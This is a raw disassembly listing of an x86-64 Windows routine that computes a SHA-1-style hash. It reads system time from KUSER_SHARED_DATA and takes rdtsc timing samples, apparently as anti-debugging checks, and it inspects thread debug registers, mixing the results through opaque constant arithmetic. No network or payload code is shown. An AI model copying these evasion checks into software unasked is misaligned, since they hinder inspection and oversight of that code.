   14003ce65:	xchg   DWORD PTR [rip+0x5bc75],eax        # 0x140098ae0
   14003ce6b:	mov    BYTE PTR [rip+0x5bc1c],0x0        # 0x140098a8e
   14003ce72:	mov    rax,QWORD PTR [rbp+0x7b8]
   14003ce79:	add    eax,DWORD PTR [rbp+0x7d0]
   14003ce7f:	mov    QWORD PTR [rbp+0x7b8],rax
   14003ce86:	mov    eax,DWORD PTR [rbp+0x1178]
   14003ce8c:	add    eax,DWORD PTR [rbp+0x7d4]
   14003ce92:	mov    DWORD PTR [rbp+0x1178],eax
   14003ce98:	mov    eax,DWORD PTR [rbp+0x1158]
   14003ce9e:	add    eax,DWORD PTR [rbp+0x7d8]
   14003cea4:	mov    DWORD PTR [rbp+0x1158],eax
   14003ceaa:	mov    eax,DWORD PTR [rbp+0x1168]
   14003ceb0:	add    eax,DWORD PTR [rbp+0x7dc]
   14003ceb6:	mov    DWORD PTR [rbp+0x1168],eax
   14003cebc:	mov    eax,DWORD PTR [rbp+0x1170]
   14003cec2:	add    eax,DWORD PTR [rbp+0x7e0]
   14003cec8:	mov    DWORD PTR [rbp+0x1170],eax
   14003cece:	mov    rax,QWORD PTR [rbp+0x1180]
   14003ced5:	inc    rax
   14003ced8:	mov    BYTE PTR [rip+0x5bbad],0x0        # 0x140098a8c
   14003cedf:	jmp    0x14003cc15
   14003cee4:	mov    rcx,QWORD PTR [rbp+0x1160]
   14003ceeb:	mov    rdx,QWORD PTR [rbp+0xf60]
   14003cef2:	call   0x14006f7f7
   14003cef7:	mov    rax,QWORD PTR [rbp+0x7b8]
   14003cefe:	mov    DWORD PTR [rbp+0x36c],eax
   14003cf04:	mov    eax,DWORD PTR [rbp+0x1178]
   14003cf0a:	mov    DWORD PTR [rbp+0x370],eax
   14003cf10:	mov    eax,DWORD PTR [rbp+0x1158]
   14003cf16:	mov    DWORD PTR [rbp+0x374],eax
   14003cf1c:	mov    eax,DWORD PTR [rbp+0x1168]
   14003cf22:	mov    DWORD PTR [rbp+0x378],eax
   14003cf28:	mov    ecx,DWORD PTR [rbp+0x1170]
   14003cf2e:	mov    DWORD PTR [rbp+0x37c],ecx
   14003cf34:	mov    eax,DWORD PTR [rbp+0x36c]
   14003cf3a:	mov    DWORD PTR [rbp+0xf80],eax
   14003cf40:	mov    eax,DWORD PTR [rbp+0x370]
   14003cf46:	mov    DWORD PTR [rbp+0xf84],eax
   14003cf4c:	mov    eax,DWORD PTR [rbp+0x374]
   14003cf52:	mov    DWORD PTR [rbp+0xf88],eax
   14003cf58:	mov    eax,DWORD PTR [rbp+0x378]
   14003cf5e:	mov    DWORD PTR [rbp+0xf8c],eax
   14003cf64:	mov    DWORD PTR [rbp+0xf90],ecx
   14003cf6a:	mov    eax,DWORD PTR [rbp+0xf80]
   14003cf70:	mov    DWORD PTR [rbp+0x1180],eax
   14003cf76:	mov    eax,DWORD PTR [rbp+0xf84]
   14003cf7c:	mov    DWORD PTR [rbp+0x1168],eax
   14003cf82:	mov    r12d,DWORD PTR [rbp+0xf88]
   14003cf89:	mov    r13d,DWORD PTR [rbp+0xf8c]
   14003cf90:	xorps  xmm0,xmm0
   14003cf93:	lea    rsi,[rbp+0x1060]
   14003cf9a:	movaps XMMWORD PTR [rsi+0x30],xmm0
   14003cf9e:	movaps XMMWORD PTR [rsi+0x20],xmm0
   14003cfa2:	movaps XMMWORD PTR [rsi+0x10],xmm0
   14003cfa6:	movaps XMMWORD PTR [rsi],xmm0
   14003cfa9:	xor    r14d,r14d
   14003cfac:	lea    rdi,[rip+0x4b19d]        # 0x140088150
   14003cfb3:	lea    rbx,[rbp+0x7d0]
   14003cfba:	cmp    r14,0x14
   14003cfbe:	je     0x14003d003
   14003cfc0:	lea    r15,[r14+0x4]
   14003cfc4:	mov    rcx,r14
   14003cfc7:	mov    rdx,r15
   14003cfca:	mov    r8,rsi
   14003cfcd:	mov    r9,rdi
   14003cfd0:	call   0x14003ad60
   14003cfd5:	mov    ecx,DWORD PTR [rbp+r14*1+0xf80]
   14003cfdd:	mov    DWORD PTR [rbp+0x7d0],ecx
   14003cfe3:	lea    rcx,[rip+0x4b17e]        # 0x140088168
   14003cfea:	mov    QWORD PTR [rsp+0x20],rcx
   14003cfef:	mov    rcx,rax
   14003cff2:	mov    r8,rbx
   14003cff5:	push   0x4
   14003cff7:	pop    r9
   14003cff9:	call   0x1400638fe
   14003cffe:	mov    r14,r15
   14003d001:	jmp    0x14003cfba
   14003d003:	xorps  xmm0,xmm0
   14003d006:	movaps XMMWORD PTR [rbp+0xd40],xmm0
   14003d00d:	movaps XMMWORD PTR [rbp+0xd30],xmm0
   14003d014:	movaps XMMWORD PTR [rbp+0xd20],xmm0
   14003d01b:	movaps XMMWORD PTR [rbp+0xd10],xmm0
   14003d022:	xor    eax,eax
   14003d024:	mov    ebx,DWORD PTR [rbp+0x1180]
   14003d02a:	mov    r14d,DWORD PTR [rbp+0x1168]
   14003d031:	cmp    rax,0x40
   14003d035:	je     0x14003d04d
   14003d037:	mov    ecx,DWORD PTR [rbp+rax*1+0x1060]
   14003d03e:	bswap  ecx
   14003d040:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   14003d047:	add    rax,0x4
   14003d04b:	jmp    0x14003d031
   14003d04d:	mov    DWORD PTR [rbp+0x7d0],ebx
   14003d053:	mov    DWORD PTR [rbp+0x7d4],r14d
   14003d05a:	mov    DWORD PTR [rbp+0x7d8],r12d
   14003d061:	mov    DWORD PTR [rbp+0x7dc],r13d
   14003d068:	mov    eax,DWORD PTR [rbp+0x1170]
   14003d06e:	mov    DWORD PTR [rbp+0x7e0],eax
   14003d074:	and    DWORD PTR [rbp+0x7e4],0x0
   14003d07b:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   14003d082:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   14003d089:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   14003d090:	movaps xmm3,XMMWORD PTR [rbp+0xd40]
   14003d097:	movups XMMWORD PTR [rbp+0x7e8],xmm0
   14003d09e:	movups XMMWORD PTR [rbp+0x7f8],xmm1
   14003d0a5:	movups XMMWORD PTR [rbp+0x808],xmm2
   14003d0ac:	movups XMMWORD PTR [rbp+0x818],xmm3
   14003d0b3:	call   0x140064214
   14003d0b8:	mov    al,BYTE PTR [rip+0x5b9cf]        # 0x140098a8d
   14003d0be:	cmp    al,0x1
   14003d0c0:	je     0x14003d106
   14003d0c2:	movzx  eax,al
   14003d0c5:	cmp    eax,0x2
   14003d0c8:	je     0x14003d1b8
   14003d0ce:	lea    r9,[rbp+0x500]
   14003d0d5:	and    DWORD PTR [r9],0x0
   14003d0d9:	push   0x40
   14003d0db:	pop    r8
   14003d0dd:	lea    rcx,[rip+0xfffffffffffc3f9c]        # 0x140001080
   14003d0e4:	mov    rdx,QWORD PTR [rbp+0x1150]
   14003d0eb:	call   QWORD PTR [rip+0x57717]        # 0x140094808
   14003d0f1:	test   eax,eax
   14003d0f3:	sete   cl
   14003d0f6:	inc    cl
   14003d0f8:	mov    BYTE PTR [rip+0x5b98f],cl        # 0x140098a8d
   14003d0fe:	test   eax,eax
   14003d100:	je     0x14003d1b8
   14003d106:	mov    al,BYTE PTR [rip+0x5baac]        # 0x140098bb8
   14003d10c:	cmp    al,0x1
   14003d10e:	je     0x14003d137
   14003d110:	movzx  eax,al
   14003d113:	test   eax,eax
   14003d115:	jne    0x14003d1b8
   14003d11b:	call   0x140065d51
   14003d120:	test   rax,rax
   14003d123:	sete   cl
   14003d126:	inc    cl
   14003d128:	mov    BYTE PTR [rip+0x5ba8a],cl        # 0x140098bb8
   14003d12e:	test   rax,rax
   14003d131:	je     0x14003d1b8
   14003d137:	call   0x140064227
   14003d13c:	mov    eax,0xc8c291de
   14003d141:	xchg   DWORD PTR [rip+0x5b999],eax        # 0x140098ae0
   14003d147:	call   QWORD PTR [rip+0x57503]        # 0x140094650
   14003d14d:	mov    eax,eax
   14003d14f:	mov    QWORD PTR [rip+0x5aeaa],rax        # 0x140098000
   14003d156:	lea    rsi,[rbp+0x7d0]
   14003d15d:	push   0xffffffffffffffff
   14003d15f:	pop    rdx
   14003d160:	mov    rcx,rsi
   14003d163:	call   0x140001080
   14003d168:	xor    eax,eax
   14003d16a:	xchg   DWORD PTR [rip+0x5b970],eax        # 0x140098ae0
   14003d170:	mov    BYTE PTR [rip+0x5b917],0x0        # 0x140098a8e
   14003d177:	add    ebx,DWORD PTR [rsi]
   14003d179:	add    r14d,DWORD PTR [rsi+0x4]
   14003d17d:	add    r12d,DWORD PTR [rsi+0x8]
   14003d181:	add    r13d,DWORD PTR [rsi+0xc]
   14003d185:	mov    eax,DWORD PTR [rbp+0x1170]
   14003d18b:	add    eax,DWORD PTR [rsi+0x10]
   14003d18e:	mov    BYTE PTR [rip+0x5b8f7],0x0        # 0x140098a8c
   14003d195:	mov    DWORD PTR [rbp+0x250],ebx
   14003d19b:	mov    DWORD PTR [rbp+0x254],r14d
   14003d1a2:	mov    DWORD PTR [rbp+0x258],r12d
   14003d1a9:	mov    DWORD PTR [rbp+0x25c],r13d
   14003d1b0:	mov    DWORD PTR [rbp+0x260],eax
   14003d1b6:	jmp    0x14003d1d0
   14003d1b8:	mov    BYTE PTR [rip+0x5b8cd],0x0        # 0x140098a8c
   14003d1bf:	xorps  xmm0,xmm0
   14003d1c2:	movaps XMMWORD PTR [rbp+0x250],xmm0
   14003d1c9:	and    DWORD PTR [rbp+0x260],0x0
   14003d1d0:	lea    rdx,[rbp+0x250]
   14003d1d7:	movaps xmm0,XMMWORD PTR [rdx]
   14003d1da:	movaps XMMWORD PTR [rbp+0x3b0],xmm0
   14003d1e1:	mov    eax,DWORD PTR [rdx+0x10]
   14003d1e4:	mov    DWORD PTR [rbp+0x3c0],eax
   14003d1ea:	lea    rcx,[rbp+0x200]
   14003d1f1:	push   0xa
   14003d1f3:	pop    r8
   14003d1f5:	push   0xe
   14003d1f7:	pop    r9
   14003d1f9:	call   0x140063f9d
   14003d1fe:	lea    rcx,[rip+0x4a84b]        # 0x140087a50
   14003d205:	mov    edx,0x42d
   14003d20a:	call   0x14003bee8
   14003d20f:	mov    QWORD PTR [rbp+0x230],rax
   14003d216:	mov    QWORD PTR [rbp+0x238],rdx
   14003d21d:	mov    eax,0x1d43
   14003d222:	mov    QWORD PTR [rbp+0x240],rax
   14003d229:	mov    QWORD PTR [rbp+0x3a0],rax
   14003d230:	mov    rax,QWORD PTR [rbp+0x230]
   14003d237:	mov    QWORD PTR [rbp+0x390],rax
   14003d23e:	mov    rax,QWORD PTR [rbp+0x238]
   14003d245:	mov    QWORD PTR [rbp+0x398],rax
   14003d24c:	call   0x140064168
   14003d251:	cmp    rax,0x1
   14003d255:	jne    0x14003cad1
   14003d25b:	mov    rsi,rdx
   14003d25e:	call   0x1400641b3
   14003d263:	mov    rcx,rsi
   14003d266:	call   0x140064146
   14003d26b:	cmp    rax,0x1
   14003d26f:	jne    0x14003cad1
   14003d275:	mov    r8,rdx
   14003d278:	lea    r9,[rip+0x26f34]        # 0x1400641b3
   14003d27f:	sub    r9d,esi
   14003d282:	lea    rdi,[rbp+0x7d0]
   14003d289:	mov    rcx,rdi
   14003d28c:	mov    rdx,rsi
   14003d28f:	call   0x1400665bf
   14003d294:	mov    rbx,QWORD PTR [rdi]
   14003d297:	mov    rax,rbx
   14003d29a:	neg    rax
   14003d29d:	jo     0x14003cad1
   14003d2a3:	mov    r14,QWORD PTR [rbp+0x7d8]
   14003d2aa:	mov    rsi,QWORD PTR [rbp+0x7e0]
   14003d2b1:	call   0x140064168
   14003d2b6:	cmp    rax,0x1
   14003d2ba:	jne    0x14003d420
   14003d2c0:	mov    rdi,rdx
   14003d2c3:	call   0x1400641b3
   14003d2c8:	mov    rcx,rdi
   14003d2cb:	call   0x140064146
   14003d2d0:	cmp    rax,0x1
   14003d2d4:	jne    0x14003d420
   14003d2da:	mov    r8,rdx
   14003d2dd:	mov    QWORD PTR [rbp+0x6a0],r14
   14003d2e4:	mov    QWORD PTR [rbp+0x6d0],rbx
   14003d2eb:	lea    r9,[rip+0x26ec1]        # 0x1400641b3
   14003d2f2:	sub    r9d,edi
   14003d2f5:	lea    rbx,[rbp+0x7d0]
   14003d2fc:	mov    rcx,rbx
   14003d2ff:	mov    rdx,rdi
   14003d302:	call   0x140066aac
   14003d307:	cmp    BYTE PTR [rbx],0x0
   14003d30a:	je     0x14003d412
   14003d310:	mov    eax,DWORD PTR [rbp+0x1178]
   14003d316:	mov    rcx,QWORD PTR [rbp+0x7b8]
   14003d31d:	shl    rcx,0x20
   14003d321:	or     rcx,rax
   14003d324:	mov    rax,QWORD PTR [rbp+0x7c0]
   14003d32b:	add    QWORD PTR [rbp+0x600],rax
   14003d332:	bswap  rcx
   14003d335:	mov    QWORD PTR [rbp+0x7b8],rcx
   14003d33c:	mov    rax,QWORD PTR [rbp+0x7e0]
   14003d343:	mov    rcx,QWORD PTR [rbp+0x7d8]
   14003d34a:	add    rcx,rdi
   14003d34d:	mov    QWORD PTR [rbp+0x608],rcx
   14003d354:	mov    QWORD PTR [rbp+0x680],rcx
   14003d35b:	mov    QWORD PTR [rbp+0x6d8],rax
   14003d362:	mov    QWORD PTR [rbp+0x688],rax
   14003d369:	lea    rcx,[rbp+0xcc0]
   14003d370:	mov    QWORD PTR [rbp+0x1160],rcx
   14003d377:	mov    rdx,QWORD PTR [rbp+0x6a0]
   14003d37e:	mov    r8,rsi
   14003d381:	call   0x140063bc8
   14003d386:	mov    QWORD PTR [rbp+0x5e8],0x0
   14003d391:	push   0x11
   14003d393:	pop    r8
   14003d395:	dec    r8d
   14003d398:	je     0x14003d3c1
   14003d39a:	mov    edx,DWORD PTR ds:0x7ffe000c
   14003d3a1:	mov    eax,edx
   14003d3a3:	mov    ecx,DWORD PTR ds:0x7ffe0008
   14003d3aa:	shl    rdx,0x20
   14003d3ae:	or     rdx,rcx
   14003d3b1:	mov    QWORD PTR [rbp+0x5e8],rdx
   14003d3b8:	cmp    eax,DWORD PTR ds:0x7ffe0010
   14003d3bf:	jne    0x14003d395
   14003d3c1:	call   0x140065f8e
   14003d3c6:	mov    QWORD PTR [rbp+0x5f0],rax
   14003d3cd:	rdtsc
   14003d3cf:	shl    rdx,0x20
   14003d3d3:	or     rdx,rax
   14003d3d6:	mov    QWORD PTR [rbp+0x6b8],rdx
   14003d3dd:	and    QWORD PTR [rbp+0x3d0],0x0
   14003d3e5:	xor    eax,eax
   14003d3e7:	cmp    rax,0x40
   14003d3eb:	je     0x14003d42b
   14003d3ed:	mov    QWORD PTR [rbp+rax*1+0x7d0],0x1
   14003d3f9:	and    QWORD PTR [rbp+rax*1+0x7d8],0x0
   14003d402:	add    rax,0x10
   14003d406:	jmp    0x14003d3e7
   14003d408:	call   0x14007e4c3
   14003d40d:	jmp    0x14003c679
   14003d412:	mov    rbx,QWORD PTR [rbp+0x6d0]
   14003d419:	mov    r14,QWORD PTR [rbp+0x6a0]
   14003d420:	mov    rcx,rbx
   14003d423:	mov    rdx,r14
   14003d426:	jmp    0x14003cacc
   14003d42b:	lea    rax,[rbp+0xb00]
   14003d432:	movups xmm0,XMMWORD PTR [rax-0x320]
   14003d439:	movups xmm1,XMMWORD PTR [rax-0x310]
   14003d440:	movups xmm2,XMMWORD PTR [rax-0x300]
   14003d447:	lea    rax,[rbp+0x500]
   14003d44e:	movups XMMWORD PTR [rax+0x30],xmm2
   14003d452:	movups XMMWORD PTR [rax+0x20],xmm1
   14003d456:	movups XMMWORD PTR [rax+0x10],xmm0
   14003d45a:	mov    rcx,QWORD PTR [rbp+0x6a0]
   14003d461:	mov    QWORD PTR [rax],rcx
   14003d464:	mov    QWORD PTR [rax+0x8],rsi
   14003d468:	push   0x1
   14003d46a:	pop    rdx
   14003d46b:	mov    QWORD PTR [rax+0x40],rdx
   14003d46f:	lea    rcx,[rsi+0x11]
   14003d473:	mov    r8,rcx
   14003d476:	shr    r8,0x6
   14003d47a:	and    ecx,0x3f
   14003d47d:	cmp    rcx,rdx
   14003d480:	sbb    r8,0xffffffffffffffff
   14003d484:	mov    QWORD PTR [rbp+0x6c8],r8
   14003d48b:	shl    r8,0x6
   14003d48f:	sub    r8,rsi
   14003d492:	lea    rcx,[rsi*8+0x40]
   14003d49a:	bswap  rcx
   14003d49d:	mov    QWORD PTR [rbp+0x7a0],r8
   14003d4a4:	add    r8,0xffffffffffffffef
   14003d4a8:	mov    QWORD PTR [rbp+0x1060],rax
   14003d4af:	mov    QWORD PTR [rbp+0x1068],rdx
   14003d4b6:	xorps  xmm6,xmm6
   14003d4b9:	movups XMMWORD PTR [rbp+0x1070],xmm6
   14003d4c0:	lea    rax,[rbp+0xcc0]
   14003d4c7:	mov    QWORD PTR [rbp+0x1080],rax
   14003d4ce:	lea    rax,[rbp+0x390]
   14003d4d5:	mov    QWORD PTR [rbp+0x1088],rax
   14003d4dc:	lea    rax,[rbp+0x680]
   14003d4e3:	mov    QWORD PTR [rbp+0x1090],rax
   14003d4ea:	lea    rax,[rbp+0x3d0]
   14003d4f1:	mov    QWORD PTR [rbp+0x1098],rax
   14003d4f8:	mov    rax,QWORD PTR [rbp+0x6b8]
   14003d4ff:	mov    QWORD PTR [rbp+0x10a0],rax
   14003d506:	mov    rax,QWORD PTR [rbp+0x5f0]
   14003d50d:	mov    QWORD PTR [rbp+0x10a8],rax
   14003d514:	mov    rax,QWORD PTR [rbp+0x5e8]
   14003d51b:	mov    QWORD PTR [rbp+0x10b0],rax
   14003d522:	movups XMMWORD PTR [rbp+0x10b8],xmm6
   14003d529:	and    QWORD PTR [rbp+0x10c8],0x0
   14003d531:	mov    QWORD PTR [rbp+0x5f8],r8
   14003d538:	mov    QWORD PTR [rbp+0x10d0],r8
   14003d53f:	mov    QWORD PTR [rbp+0x10d8],rcx
   14003d546:	mov    DWORD PTR [rbp+0x7a8],0x67452301
   14003d550:	mov    eax,0xefcdab89
   14003d555:	mov    QWORD PTR [rbp+0xd08],rax
   14003d55c:	mov    DWORD PTR [rbp+0x1134],0x98badcfe
   14003d566:	mov    eax,0x10325476
   14003d56b:	mov    QWORD PTR [rbp+0xcb8],rax
   14003d572:	mov    DWORD PTR [rbp+0x708],0xc3d2e1f0
   14003d57c:	movabs r14,0x406aa9c82dbf9701
   14003d586:	movabs r12,0xeb591050d1f713a9
   14003d590:	mov    QWORD PTR [rbp+0xf70],0x0
   14003d59b:	xor    ebx,ebx
   14003d59d:	xor    edi,edi
   14003d59f:	xor    esi,esi
   14003d5a1:	xor    eax,eax
   14003d5a3:	lea    r13,[rbp+0x7d0]
   14003d5aa:	cmp    rax,QWORD PTR [rbp+0x6c8]
   14003d5b1:	je     0x1400418cd
   14003d5b7:	inc    rax
   14003d5ba:	mov    QWORD PTR [rbp+0x6c0],rax
   14003d5c1:	movaps XMMWORD PTR [rbp+0x740],xmm6
   14003d5c8:	movaps XMMWORD PTR [rbp+0x730],xmm6
   14003d5cf:	movaps XMMWORD PTR [rbp+0x720],xmm6
   14003d5d6:	movaps XMMWORD PTR [rbp+0x710],xmm6
   14003d5dd:	xor    r8d,r8d
   14003d5e0:	cmp    r8,0x40
   14003d5e4:	je     0x1400416eb
   14003d5ea:	mov    rdx,r8
   14003d5ed:	inc    r8
   14003d5f0:	test   rsi,rsi
   14003d5f3:	sete   cl
   14003d5f6:	mov    rax,QWORD PTR [rbp+0x508]
   14003d5fd:	mov    r9,rdi
   14003d600:	test   cl,0x1
   14003d603:	je     0x14003d635
   14003d605:	xor    edi,edi
   14003d607:	mov    ecx,0x0
   14003d60c:	cmp    r9,rax
   14003d60f:	jae    0x14003d5fd
   14003d611:	and    QWORD PTR [rbp+0x1070],0x0
   14003d619:	mov    rax,QWORD PTR [rbp+0x500]
   14003d620:	mov    al,BYTE PTR [rax+r9*1]
   14003d624:	inc    r9
   14003d627:	mov    QWORD PTR [rbp+0x1078],r9
   14003d62e:	xor    esi,esi
   14003d630:	jmp    0x1400412cc
   14003d635:	mov    QWORD PTR [rbp+0x1070],0x1
   14003d640:	mov    QWORD PTR [rbp+0x1078],r9
   14003d647:	and    QWORD PTR [rbp+0x1080],0x0
   14003d64f:	cmp    QWORD PTR [rbp+0x1160],0x0
   14003d657:	je     0x140041234
   14003d65d:	mov    QWORD PTR [rbp+0xf68],r9
   14003d664:	mov    QWORD PTR [rbp+0x7c8],r8
   14003d66b:	mov    QWORD PTR [rbp+0xca8],rdx
   14003d672:	mov    QWORD PTR [rbp+0x5d0],rbx
   14003d679:	rdtsc
   14003d67b:	mov    rsi,rdx
   14003d67e:	shl    rsi,0x20
   14003d682:	or     rsi,rax
   14003d685:	call   0x140065f8e
   14003d68a:	mov    rdi,rax
   14003d68d:	push   0x11
   14003d68f:	pop    rax
   14003d690:	xor    ebx,ebx
   14003d692:	dec    eax
   14003d694:	je     0x14003d6b6
   14003d696:	mov    ebx,DWORD PTR ds:0x7ffe000c
   14003d69d:	mov    ecx,ebx
   14003d69f:	mov    edx,DWORD PTR ds:0x7ffe0008
   14003d6a6:	shl    rbx,0x20
   14003d6aa:	or     rbx,rdx
   14003d6ad:	cmp    ecx,DWORD PTR ds:0x7ffe0010
   14003d6b4:	jne    0x14003d692
   14003d6b6:	sub    rsi,QWORD PTR [rbp+0x6b8]
   14003d6bd:	sub    rdi,QWORD PTR [rbp+0x5f0]
   14003d6c4:	call   0x140066006
   14003d6c9:	sub    rbx,QWORD PTR [rbp+0x5e8]
   14003d6d0:	mov    rcx,rsi
   14003d6d3:	mov    rdx,rdi
   14003d6d6:	mov    r8,rax
   14003d6d9:	mov    r9,rbx
   14003d6dc:	call   0x14003adfb
   14003d6e1:	mov    DWORD PTR [rbp+0x4e0],eax
   14003d6e7:	mov    rax,QWORD PTR [rbp+0x1160]
   14003d6ee:	mov    rsi,QWORD PTR [rax]
   14003d6f1:	lea    rcx,[rbp+0xd10]
   14003d6f8:	call   0x140066080
   14003d6fd:	cmp    BYTE PTR [rbp+0xd10],0x0
   14003d704:	lea    rax,[rbp+0xd18]
   14003d70b:	jne    0x14003d77b
   14003d70d:	mov    ecx,0x4d0
   14003d712:	xor    eax,eax
   14003d714:	mov    rdi,r13
   14003d717:	rep stos BYTE PTR [rdi],al
   14003d719:	mov    DWORD PTR [rbp+0x800],0x100010
   14003d723:	call   QWORD PTR [rip+0x56f1f]        # 0x140094648
   14003d729:	mov    rcx,rax
   14003d72c:	mov    rdx,r13
   14003d72f:	call   QWORD PTR [rip+0x56fb3]        # 0x1400946e8
   14003d735:	test   eax,eax
   14003d737:	je     0x14003d76f
   14003d739:	movups xmm0,XMMWORD PTR [rbp+0x818]
   14003d740:	movups xmm1,XMMWORD PTR [rbp+0x828]
   14003d747:	mov    rax,QWORD PTR [rbp+0x840]
   14003d74e:	movups XMMWORD PTR [rbp+0xd18],xmm0
   14003d755:	movups XMMWORD PTR [rbp+0xd28],xmm1
   14003d75c:	mov    QWORD PTR [rbp+0xd38],rax
   14003d763:	push   0x1
   14003d765:	pop    rcx
   14003d766:	lea    rax,[rbp+0xd18]
   14003d76d:	jmp    0x14003d774
   14003d76f:	xor    ecx,ecx
   14003d771:	mov    rax,r13
   14003d774:	mov    QWORD PTR [rbp+0xd10],rcx
   14003d77b:	and    QWORD PTR [rbp+0x7f0],0x0
   14003d783:	movaps XMMWORD PTR [rbp+0x7e0],xmm6
   14003d78a:	movaps XMMWORD PTR [rbp+0x7d0],xmm6
   14003d791:	movups xmm0,XMMWORD PTR [rax]
   14003d794:	movups xmm1,XMMWORD PTR [rax+0x10]
   14003d798:	movaps XMMWORD PTR [rbp+0xf80],xmm0
   14003d79f:	movaps XMMWORD PTR [rbp+0xf90],xmm1
   14003d7a6:	mov    rax,QWORD PTR [rax+0x20]
   14003d7aa:	mov    QWORD PTR [rbp+0xfa0],rax
   14003d7b1:	lea    rcx,[rbp+0xf80]
   14003d7b8:	mov    rdx,rsi
   14003d7bb:	call   0x140063b2a
   14003d7c0:	mov    QWORD PTR [rbp+0x4e8],rax
   14003d7c7:	mov    rax,QWORD PTR [rbp+0x1160]
   14003d7ce:	mov    rcx,QWORD PTR [rax+0x8]
   14003d7d2:	rdtsc
   14003d7d4:	shl    rdx,0x20
   14003d7d8:	or     rdx,rax
   14003d7db:	movabs rsi,0x34af503834f2a1da
   14003d7e5:	xor    rdx,rsi
   14003d7e8:	imul   rdx,r14
   14003d7ec:	mov    rax,rdx
   14003d7ef:	shr    rax,0x1d
   14003d7f3:	xor    rax,rdx
   14003d7f6:	imul   rax,r12
   14003d7fa:	mov    r15,r14
   14003d7fd:	mov    r14,rax
   14003d800:	shr    r14,0x20
   14003d804:	xor    r14,rax
   14003d807:	mov    rbx,r14
   14003d80a:	neg    rbx
   14003d80d:	add    rbx,rcx
   14003d810:	call   0x140065b3f
   14003d815:	mov    rcx,r14
   14003d818:	xor    rcx,rsi
   14003d81b:	imul   rcx,r15
   14003d81f:	mov    rdx,rcx
   14003d822:	shr    rdx,0x1d
   14003d826:	xor    rdx,rcx
   14003d829:	imul   rdx,r12
   14003d82d:	mov    rsi,rdx
   14003d830:	shr    rsi,0x20
   14003d834:	xor    rsi,rdx
   14003d837:	mov    rdx,rsi
   14003d83a:	rol    rdx,0x7
   14003d83e:	mov    rdi,rsi
   14003d841:	rol    rdi,0x29
   14003d845:	movzx  eax,al
   14003d848:	add    rax,rdx
   14003d84b:	mov    rcx,rdi
   14003d84e:	sub    rdi,rdx
   14003d851:	movabs rdx,0x38a95a1996f05387
   14003d85b:	imul   rax,rdx
   14003d85f:	movabs r8,0xc4afc7660ecd07f6
   14003d869:	add    rax,r8
   14003d86c:	add    rax,r14
   14003d86f:	add    rax,rbx
   14003d872:	imul   rcx,rdx
   14003d876:	movabs r8,0xf24f7a7152484280
   14003d880:	add    rcx,r8
   14003d883:	imul   rdi,rdx
   14003d887:	movabs rdx,0x2d9fb30b437b3a8a
   14003d891:	add    rdi,rdx
   14003d894:	sub    rdi,rsi
   14003d897:	sub    rdi,rcx
   14003d89a:	add    rdi,rax
   14003d89d:	call   0x140065e3e
   14003d8a2:	mov    rcx,rsi
   14003d8a5:	movabs rdx,0x1e586e515d757276
   14003d8af:	xor    rcx,rdx
   14003d8b2:	imul   rcx,r15
   14003d8b6:	mov    rdx,rcx
   14003d8b9:	shr    rdx,0x1d
   14003d8bd:	xor    rdx,rcx
   14003d8c0:	imul   rdx,r12
   14003d8c4:	mov    r14,rdx
   14003d8c7:	shr    r14,0x20
   14003d8cb:	xor    r14,rdx
   14003d8ce:	mov    rdx,r14
   14003d8d1:	rol    rdx,0x7
   14003d8d5:	mov    rbx,r12
   14003d8d8:	mov    r12,r14
   14003d8db:	rol    r12,0x29
   14003d8df:	movzx  eax,al
   14003d8e2:	add    rax,rdx
   14003d8e5:	mov    rcx,r12
   14003d8e8:	sub    r12,rdx
   14003d8eb:	movabs rdx,0x352fd32b93d40fa1
   14003d8f5:	imul   rax,rdx
   14003d8f9:	movabs r8,0x49db77743449e636
   14003d903:	add    rax,r8
   14003d906:	add    rax,rsi
   14003d909:	add    rax,rdi
   14003d90c:	imul   rcx,rdx
   14003d910:	movabs r8,0x2010276053421089
   14003d91a:	add    rcx,r8
   14003d91d:	imul   r12,rdx
   14003d921:	movabs rdx,0xd634afec1ef82a53
   14003d92b:	add    r12,rdx
   14003d92e:	sub    r12,r14
   14003d931:	sub    r12,rcx
   14003d934:	add    r12,rax
   14003d937:	call   0x140065eb3
   14003d93c:	mov    rcx,r14
   14003d93f:	movabs rdx,0x7d99216e928b59c6
   14003d949:	xor    rcx,rdx
   14003d94c:	imul   rcx,r15
   14003d950:	mov    rdx,rcx
   14003d953:	shr    rdx,0x1d
   14003d957:	xor    rdx,rcx
   14003d95a:	imul   rdx,rbx
   14003d95e:	mov    rbx,rdx
   14003d961:	shr    rbx,0x20
   14003d965:	xor    rbx,rdx
   14003d968:	mov    rdx,rbx
   14003d96b:	rol    rdx,0x7
   14003d96f:	mov    r15,rbx
   14003d972:	rol    r15,0x29
   14003d976:	movzx  eax,al
   14003d979:	add    rax,rdx
   14003d97c:	mov    rcx,r15
   14003d97f:	sub    r15,rdx
   14003d982:	movabs rdx,0x1522e06d579f1f85
   14003d98c:	imul   rax,rdx
   14003d990:	movabs r8,0xa1439b8e0e3e9dde
   14003d99a:	add    rax,r8
   14003d99d:	add    rax,r14
   14003d9a0:	add    rax,r12
   14003d9a3:	imul   rcx,rdx
   14003d9a7:	movabs r8,0x804aab97d81a712e
   14003d9b1:	add    rcx,r8
   14003d9b4:	imul   r15,rdx
   14003d9b8:	movabs rdx,0xdf071009c9dbd350
   14003d9c2:	add    r15,rdx
   14003d9c5:	sub    r15,rbx
   14003d9c8:	sub    r15,rcx
   14003d9cb:	add    r15,rax
   14003d9ce:	mov    al,BYTE PTR [rip+0x5b1e4]        # 0x140098bb8
   14003d9d4:	cmp    al,0x1
   14003d9d6:	je     0x14003d9ff
   14003d9d8:	movzx  eax,al
   14003d9db:	test   eax,eax
   14003d9dd:	jne    0x14003e3ca
   14003d9e3:	call   0x140065d51
   14003d9e8:	test   rax,rax
   14003d9eb:	sete   cl
   14003d9ee:	inc    cl
   14003d9f0:	mov    BYTE PTR [rip+0x5b1c2],cl        # 0x140098bb8
   14003d9f6:	test   rax,rax
   14003d9f9:	je     0x14003e3ca
   14003d9ff:	movabs rax,0xd480ed632a37929a
   14003da09:	movabs rcx,0x7fadadb490d9f40a
   14003da13:	xor    rax,rcx
   14003da16:	movabs rcx,0x406aa9c82dbf9701
   14003da20:	imul   rax,rcx
   14003da24:	mov    rcx,rax
   14003da27:	shr    rcx,0x1d
   14003da2b:	xor    rcx,rax
   14003da2e:	movabs rax,0xeb591050d1f713a9
   14003da38:	imul   rcx,rax
